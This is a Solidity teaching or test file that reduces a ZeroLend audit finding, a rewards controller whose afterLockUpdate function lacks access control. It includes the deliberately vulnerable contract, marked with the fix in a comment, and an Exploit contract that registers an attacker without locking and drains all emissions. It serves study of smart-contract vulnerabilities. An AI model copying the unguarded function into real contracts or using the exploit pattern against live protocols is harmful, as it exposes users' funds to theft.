// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ZeroLend — Missing access control in afterLockUpdate
    (Sujith Somraaj / Cantina Jan 2024, finding #40821)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: ZLRewardsController.afterLockUpdate(user) is external with NO
    onlyZeroLocker (or authorized-caller) guard. It syncs the user's registered
    reward weight from a balance source and was intended to be invoked only by
    ZeroLocker after lock/unlock. Anyone can call it directly — the Cantina
    competition harness itself registered a user for rewards by transferring
    pool tokens and calling afterLockUpdate without any lock — so non-lockers
    drain emissions meant for locked stake.

    Vulnerable function preserved with @> VULN.
    FIX: onlyZeroLocker modifier (msg.sender == locker). */

contract MockToken {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Authorized locker — the ONLY intended caller of afterLockUpdate.
contract ZeroLocker {
    ZLRewardsController public controller;

    function setController(ZLRewardsController c) external {
        controller = c;
    }

    /// @dev Real lock path would update ve balance then notify the controller.
    function notifyLock(address user) external {
        controller.afterLockUpdate(user);
    }
}

/// @notice Reduced ZLRewardsController — public afterLockUpdate registers stake.
contract ZLRewardsController {
    MockToken public poolToken; // balance source for registered amount
    MockToken public rewardToken;
    ZeroLocker public locker;

    struct UserInfo {
        uint256 amount;
        uint256 rewardDebt;
    }

    uint256 public accRewardPerShare; // scaled by 1e12
    uint256 public totalRegistered;
    mapping(address => UserInfo) public userInfo;

    uint256 public constant ACC_PRECISION = 1e12;

    constructor(MockToken poolToken_, MockToken rewardToken_, ZeroLocker locker_) {
        poolToken = poolToken_;
        rewardToken = rewardToken_;
        locker = locker_;
    }

    /// @dev Fund emissions (owner/emissions contract in production).
    function fundRewards(uint256 amount) external {
        // reward tokens already minted to this contract; increase acc per share
        if (totalRegistered > 0) {
            accRewardPerShare += (amount * ACC_PRECISION) / totalRegistered;
        }
    }

    /// @notice Update a user's registered balance after lock changes.
    ///         MUST only be callable by ZeroLocker — missing in vulnerable code.
    function afterLockUpdate(address _user) external {
        // FIX: require(msg.sender == address(locker), "Unauthorized");
        _updateRegisteredBalance(_user); // @> VULN: missing onlyZeroLocker — any caller can register balances
    }

    function _updateRegisteredBalance(address user) internal {
        UserInfo storage u = userInfo[user];
        // Settle pending under old weight
        if (u.amount > 0) {
            uint256 pending = (u.amount * accRewardPerShare) / ACC_PRECISION - u.rewardDebt;
            if (pending > 0) {
                rewardToken.transfer(user, pending);
            }
        }
        // Register current pool-token balance as reward weight (as in the
        // competition harness: transfer tokens + afterLockUpdate → eligible).
        uint256 newAmount = poolToken.balanceOf(user);
        totalRegistered = totalRegistered - u.amount + newAmount;
        u.amount = newAmount;
        u.rewardDebt = (newAmount * accRewardPerShare) / ACC_PRECISION;
    }

    function pendingReward(address user) external view returns (uint256) {
        UserInfo storage u = userInfo[user];
        if (u.amount == 0) return 0;
        return (u.amount * accRewardPerShare) / ACC_PRECISION - u.rewardDebt;
    }

    function claim(address user) external returns (uint256 pending) {
        UserInfo storage u = userInfo[user];
        pending = (u.amount * accRewardPerShare) / ACC_PRECISION - u.rewardDebt;
        if (pending > 0) {
            u.rewardDebt = (u.amount * accRewardPerShare) / ACC_PRECISION;
            rewardToken.transfer(user, pending);
        }
    }
}

contract Attacker {
    function register(ZLRewardsController c) external {
        c.afterLockUpdate(address(this));
    }

    function claim(ZLRewardsController c) external returns (uint256) {
        return c.claim(address(this));
    }
}

contract Exploit {
    MockToken public poolToken; // 1 — e.g. ZERO / aToken held without locking
    MockToken public rewardToken; // 2
    ZeroLocker public locker; // 3
    ZLRewardsController public controller; // 4 — vulnerable
    Attacker public attacker; // 5

    uint256 public constant STAKE = 100 ether;
    uint256 public constant EMISSION = 50 ether;

    constructor() {
        poolToken = new MockToken("Pool", "POOL");
        rewardToken = new MockToken("Reward", "RWD");
        locker = new ZeroLocker();
        controller = new ZLRewardsController(poolToken, rewardToken, locker);
        locker.setController(controller);
        attacker = new Attacker();

        // Emissions sitting on the controller.
        rewardToken.mint(address(controller), EMISSION);
        // Attacker holds pool tokens but NEVER locks via ZeroLocker.
        poolToken.mint(address(attacker), STAKE);
    }

    function run() external {
        // 1) Attacker self-registers via missing AC — no lock, no locker call.
        (uint256 amt0,) = controller.userInfo(address(attacker));
        require(amt0 == 0, "pre");
        attacker.register(controller);
        (uint256 amt1,) = controller.userInfo(address(attacker));
        require(amt1 == STAKE, "registered without lock");
        require(controller.totalRegistered() == STAKE, "total");

        // 2) Emissions accrue to the (illegitimate) registered weight.
        controller.fundRewards(EMISSION);

        uint256 pending = controller.pendingReward(address(attacker));
        require(pending == EMISSION, "full emission to non-locker");

        // 3) HARM: attacker claims all rewards without locking.
        uint256 before = rewardToken.balanceOf(address(attacker));
        uint256 got = attacker.claim(controller);
        require(got == EMISSION, "claim amount");
        require(rewardToken.balanceOf(address(attacker)) == before + EMISSION, "attacker paid");
        require(rewardToken.balanceOf(address(controller)) == 0, "rewards drained");
    }
}
